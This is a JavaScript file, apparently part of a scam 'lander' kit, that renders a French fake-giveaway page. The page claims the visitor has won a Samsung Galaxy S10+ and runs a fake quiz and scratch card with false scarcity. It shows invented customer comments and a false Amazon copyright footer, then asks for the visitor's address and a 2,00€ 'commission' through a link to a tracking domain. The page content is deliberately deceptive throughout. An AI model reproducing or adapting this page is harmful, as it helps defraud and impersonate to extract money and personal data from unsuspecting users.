function markupOnLoad() {
  let markup = `<div id="light" class="white_content" style="display: none; box-shadow: 0 0 10px rgba(0,0,0,0.5); padding: 30px 30px 0; background: #f6f6f6; border: 2px solid rgb(255, 153, 0) !important; overflow: hidden;">
	
		
			
    <img src="./EgidijausIT_files/logo.png" style="display: block;width:210px;margin: -5px auto 15px auto">
    <p style="font-size: 16px; color: #000; text-align: center;">C’est presque fini ! Vous devez confirmer votre adresse et payer une petite commission (2,00€) pour une expédition assurée et une livraison par la poste.</p>
    <br>



<div class="modal-footer">
<a href="https://duktrk.com/index.php?lp=1" target="_blank"><button type="button" class="btn btn-primary" data-dismiss="modal" style="border: 2px solid rgb(255, 153, 0); background: rgb(255, 153, 0); color: White; font-weight: bold; border-radius: 25px; padding: 10px 35px; font-size: 16px; display: block; margin: 0 auto;">OK</button></a>
</div>
</div>




<div class="modal fade in" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" style="display: block; padding-right: 17px;" onclick='closeModal()'>
<div class="modal-dialog">
<div class="modal-content">
    <div class="modal-body">
        <table>
            <tbody>
                <tr>
                    <td>
                         <img src="./EgidijausIT_files/logo.png" alt="" style="max-width: 200px; display: block; margin: 0 auto 15px auto;">
                         <p style="font-size: 16px; color: #333; text-align: center;line-height: 1.6">
                                Félicitations ! Vous êtes l'un des 10 utilisateurs chanceux que nous avons sélectionnés pour tenter de gagner un Samsung Galaxy S10+.</p>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>
    <div class="modal-footer">
        <button type="button" class="btn btn-primary" data-dismiss="modal" style="background:  rgb(255, 153, 0); color: White;font-weight: bold; letter-spacing: .3; border-radius: 25px; padding: 10px 35px; font-size: 16px; margin: 0 auto; display: block;" id="btn-open" onclick='closeModal()'>OK</button>
    </div>
</div>
</div>
</div>

<div class="header">
<div style="max-width: 970px;padding: 0 20px;margin: 0 auto;display: flex;align-items: center;justify-content: space-between;height: 85px">
<img src="./EgidijausIT_files/logo.png" style="width: 250px; margin-bottom: 5px;">
<a href="#" class="block-i">
    <div class="nav-bars">
        <div class="bars"></div>
    <div class="bars"></div>
    <div class="bars"></div>
    </div>
</a>
<div class="nav-bar">
    <a href="#">
        <div class="block">
            <p>Coordonnées </p>
            <p>et Expédition</p>
        </div>
    </a>
    <a href="#">
        <div class="block">
            <p>Cartes de compte </p>
            <p>et Financement</p>
        </div>
    </a>
    <a href="#">
        <div class="block">
            <p>Épargne</p>
            <p>et Investissements</p>
        </div>
    </a>
    <a href="#">
        <div class="block">
            <p>Services</p>
            <p>clients</p>
        </div>
    </a>
    <a href="#">
        <div class="block block-y">
            <p>Services en ligne</p>
        </div>
    </a>
    <a href="#">
        <img src="./EgidijausIT_files/ico-cerca.png" alt="" style="margin: 0 5px; padding: 0 5px">
    </a>
</div>
</div>
</div>

<div class="spacer"></div>
<div class="wrapper marg-top" style="min-height: 85vh;">
<div class="wrapper contestwrap">
<div class="toptext">
    <table class="wrapper">
        <tbody>
            <tr>
                <td align="left" valign="top">
                    <h4 style="position: relative; top: 0px;text-align: center;"> Toutes nos félicitations !</h4> <br>
                    <span class="dat-1">
, 2019</span>
                </td>
            </tr>
        </tbody>
    </table>
    <div style="border-bottom:1px solid #ebebeb">
        
        <p class="wrapper" style="font-size: 16px; text-align: center;">Pour gagner, il vous suffit simplement de répondre aux 3 questions qui se trouvent ci-dessous et de remplir la page suivante avec vos coordonnées.
            <br> <br> </p>
    </div>
    <div class="wrapper select2" style="font-size: 14px; text-align: center;"> <b style=" color: #000;">Attention :</b> il ne reste que 3 prix. </div>
</div>
</div>
<div class="wrapper form_questions" data-step="1" style="position: relative; margin-top: 20px;">
<div class="question" style="display: block">
    <h3 class="question__title">Question <span class="question__num">1</span> sur 3:
        Depuis combien de temps utilisez-vous nos services ?
    </h3>
    
    <div class="button answer">
        <button class="button__text"> Depuis 1 à 2 ans </button>
    </div>
    <div class="button answer">
        <button class="button__text"> Depuis 2 à 4 ans  </button>
    </div>
    <div class="button answer">
        <button class="button__text"> Depuis plus de 4 ans  </button>
    </div>
</div>
<div class="question">
    <h3 class="question__title">Question <span class="question__num">2</span> sur 3:
        À quelle fréquence utilisez-vous nos services ?
    </h3>
    <div class="button answer">
        <button class="button__text"> Plus d'une fois par semaine </button>
    </div>
    <div class="button answer">
        <button class="button__text"> Plus d'une fois par mois </button>
    </div>
    <div class="button answer">
        <button class="button__text"> Plus d'une fois par an </button>
    </div>
    <div class="button answer">
        <button class="button__text"> Rarement </button>
    </div>
</div>
<div class="question">
    <h3 class="question__title">Question <span class="question__num">3</span> sur 3:
        Évaluez notre service:
                    </h3>
    <div class="button answer">
        <button class="button__text"> Excellent </button>
    </div>
    <div class="button answer">
        <button class="button__text"> Bien </button>
    </div>
    <div class="button answer">
        <button class="button__text"> Mauvais </button>
    </div>
</div>
</div>
<div class="wrapper validate" data-step="2">
<div class="wrapper">
    <p style="text-align: center;font-size: 18px;padding: 25px 0">Patientez s'il vous plaît...</p>
</div>
</div>
<div class="spacer" id="v4s"></div>
<div class="wrapper prize con-prize1" data-step="3">
<div class="samsung-show">
<h4 class="samsung-text">Sponsorisé par <img src="./EgidijausIT_files/samsung-logo.png"></h4>
</div>
<h2 class="gifts__title">Grattez la couche protectrice et recevez votre cadeau !
    </h2>
<h2 class="gifts__title hide gifts__title-result">Félicitations ! <br> Vous avez gagné le Samsung Galaxy S10+</h2>
<p class="attempt">Tentatives restantes :<span class="attempt__num">3</span></p>
<div class="gifts">
    <div class="gift">
        <div class="gift__inner">
            <div class="gift__images">
                <img alt="" class="gift__shape" src="./EgidijausIT_files/phone-shape.png">
                <div class="gift__before"></div>
                <img alt="" class="gift__before-2" src="./EgidijausIT_files/shape-color.png">
            </div>
        </div>
    </div>
</div>
<div class="gifts__result hide">
    <div class="button" style="background: #3CA839; border-radius: 25px; border: none; display: block;border: 2px solid #000; padding-top: 5px; padding-bottom: 5px;">
        <a style="color: #fff !important;" class="button__text" href="javascript:void(0)" onclick="ok_btn()">OBTENEZ-LE DÈS MAINTENANT</a>
    </div>
</div>
</div>
<div class="spacer"></div>
<div class="wrapper reviews">
<div class="wrapper">
    <h2>Commentaires:</h2>
</div>
<table class="wrapper" style=" padding-bottom: 10px; padding-top: 10px; " id="fb5">
    <tbody>
        <tr>
            <td width="50px" valign="top" align="right">
                <div class="roundimg s-11m"></div>
            </td>
            <td align="left" valign="top" class="commentpad">
                <div class="name">Isabel Piguenit</div>
                <div class="text">Le mien est arrivé aujourd'hui. Merci pour le Samsung S10+ !!!</div>
                <img class="fbimg" src="./EgidijausIT_files/s10-1.jpg">
                <div class="qqq">
            <div class="kkk">
            <div class="date">

                <a href="#" class="otvet">
                J'aime&nbsp;&nbsp;
                Écrire un commentaire&nbsp;&nbsp;
                Partager
                </a>
                </div>
                <div class="like-q">
                    <img src="./EgidijausIT_files/like-fb.png" alt="" style="margin-right: 2px; margin-top: -1px;">4
                </div>
                </div>

            </td>
        </tr>
    </tbody>
</table>
<table class="wrapper" id="fb4" style="padding-bottom: 10px; padding-top: 10px; display: none;">
    <tbody>
        <tr>
            <td width="50px" valign="top" align="right">
                <div class="roundimg s-33m"></div>
            </td>
            <td align="left" valign="top" class="commentpad">
                <div class="name">Claudio Bencini</div>
                <div class="text">Al principio, pensé que se trataba de una broma, pero sorprendentemente mi Galaxy S10 llegó esta mañana y no hay nada que me impida registrarme para conseguir todos, cosa que hice, ¡ja, ja, ja!</div>
                <div class="qqq">
            <div class="kkk">

                <a href="#" class="otvet">
                J'aime&nbsp;&nbsp;
                Écrire un commentaire&nbsp;&nbsp;
                Partager</a>
                </div>
                </div>
            </td>
        </tr>
    </tbody>
</table>
<table class="wrapper" id="fb3" style="padding-bottom: 10px; padding-top: 10px;">
    <tbody>
        <tr>
            <td width="50px" valign="top" align="right">
                <div class="roundimg s-66"></div>
            </td>
            <td align="left" valign="top" class="commentpad">
                <div class="name">Eve Matra</div>
                <div class="text">Ce quiz était trop facile, j'espère vraiment gagner le Galaxy S10+ aussi.</div>
                <div class="qqq">
            <div class="kkk">

                <a href="#" class="otvet">
                J'aime&nbsp;&nbsp;
                Écrire un commentaire&nbsp;&nbsp;
                Partager</a>
                </div>
                </div>
            </td>
        </tr>
    </tbody>
</table>
<table class="wrapper" id="fb2" style="padding-bottom: 10px; padding-top: 10px; ">
    <tbody>
        <tr>
            <td width="50px" valign="top" align="right">
                <div class="roundimg s-99"></div>
            </td>
            <td align="left" valign="top" class="commentpad">
                <div class="name">Brock Allan</div>
                <div class="text">Une fois, j'ai vu ce concours et je l'ai ignoré parce que je pensais que c'était une arnaque. J'ai revu cette bannière et j’ai décidé de tenter ma chance parce que je m'ennuyais... Et j’ai vraiment obtenu mon S10 ! C'EST FOU !</div>
                <div class="qqq">
            <div class="kkk">

                <a href="#" class="otvet">
                J'aime&nbsp;&nbsp;
                Écrire un commentaire&nbsp;&nbsp;
                Partager</a>
                </div>
                </div>
            </td>
        </tr>
    </tbody>
</table>
<table class="wrapper" id="fb1" style=" padding-bottom: 10px; padding-top: 10px;">
    <tbody>
        <tr>
            <td width="50px" valign="top" align="right">
                <div class="roundimg s-88m"></div>
            </td>
            <td align="left" valign="top" class="commentpad">
                <div class="name">Jacob Linton</div>
                <div class="text">Merci, j'ai donné le Samsung S10+ à mon chien comme cadeau d'anniversaire. Hahaha, je rigole, il est pour moi :D Que Dieu vous bénisse !
                <div class="qqq">
            <div class="kkk">

                <a href="#" class="otvet">
                J'aime&nbsp;&nbsp;
                Écrire un commentaire&nbsp;&nbsp;
                Partager</a>
                </div>
                <div class="like-q">
                    <img src="./EgidijausIT_files/like-fb.png" alt="" style="margin-right: 2px; margin-top: -1px;">1
                </div>
                </div>
            </div></td>
        </tr>
    </tbody>
</table>
<table class="wrapper" style="padding-bottom: 10px; padding-top: 10px;display: none">
    <tbody>
        <tr>
            <td width="50px" valign="top" align="right">
                <div class="roundimg ps4man"></div>
            </td>
            <td align="left" valign="top" class="commentpad">
                <div class="name">Bob Hall</div>
                <div class="text">Cavolo, volevo la iPhone Xs max! Non è più disponibile!!!!! Ma gratis, meglio di niente, ho avuto il mio Samsung S9 ieri...</div>
                <div class="qqq">
            <div class="kkk">

                <a href="#" class="otvet">
                J'aime&nbsp;&nbsp;
                Écrire un commentaire&nbsp;&nbsp;
                Partager</a>
                </div>
                </div>
            </td>
        </tr>
    </tbody>
</table>
<table class="wrapper" style="padding-bottom: 10px; padding-top: 10px; display: none;">
    <tbody>
        <tr>
            <td width="50px" valign="top" align="right">
                <div class="roundimg s-102m"></div>
            </td>
            <td align="left" valign="top" class="commentpad">
                <div class="name">Oliver Joiner</div>
                <div class="text">Damn, I wanted the iPhone! Its out of stock !!!!! but it's still better than nothing, I got my Samsung S9 yesterday...</div>
                
                <div class="qqq">
            <div class="kkk">

                <a href="#" class="otvet">
                J'aime&nbsp;&nbsp;
                Écrire un commentaire&nbsp;&nbsp;
                Partager</a>
                </div>
                </div>
            </td>
        </tr>
    </tbody>
</table>
<div style="height:10px"></div>
</div>
</div>
<footer>
<div class="footer-block">
<img src="./EgidijausIT_files/logo.png" alt="" width="120px" style="padding-bottom: 1px; display: block; margin: 0 auto;">
<span style="text-align: center; display: block;">
    © Amazon 2019 - Numéro de TVA : : 01114601006
</span>
</div>
</footer>

<div class="modal-backdrop fade in"></div>`;

  $("body").html(markup);
}
// ! function() {
// "undefined" != typeof window.orientation && (document.body.style.display = "inline")
// }()

function dataRouter() {
  var query = window.location.pathname.split("/")[1];
  console.log(
    window.location.origin + "/randomlander/get/" + query + "/datatest.json"
  );

  fetch(window.location.origin + "/randomlander/get/" + query)
    .then(res => res.json())
    .then(data => (obj = data))
    .then(function() {
      dataobj = obj;
      markupOnLoad();
    });
}

// function ok_btn() {
// $('#light').css('display', 'block');
// }
window.onload = function() {
  $("#myModal").modal("show");
};

function questionAnswerRender() {
  for (var i = 0; i < obj.landerText.questions.length; i++) {
    if (i == 0) {
      $(".form_questions").append(`
            <div class="question q${i}" style="display: block">
            <h3 class="question__title">Question <span class="question__num">${i +
              1}</span>/${obj.landerText.questions.length}:
            ${obj.landerText.questions[i].question}
            </h3>
        `);

      for (var j = 0; j < obj.landerText.questions[i].answers.length; j++) {
        $(".q" + i).append(`
                    <div class="button answer">
                    <button class="button__text"> ${
                      obj.landerText.questions[i].answers[j].answer
                    } </button>
                    </div>
                `);
      }
    } else {
      $(".form_questions").append(`
            <div class="question q${i}">
            <h3 class="question__title">Question <span class="question__num">${i +
              1}</span>/${obj.landerText.questions.length}:
            ${obj.landerText.questions[i].question}
            </h3>
        `);
    }

    for (var j = 0; j < obj.landerText.questions[i].answers.length; j++) {
      $(".q" + i).append(`
                    <div class="button answer">
                    <button class="button__text"> ${
                      obj.landerText.questions[i].answers[j].answer
                    } </button>
                    </div>
                `);
    }
  }
}
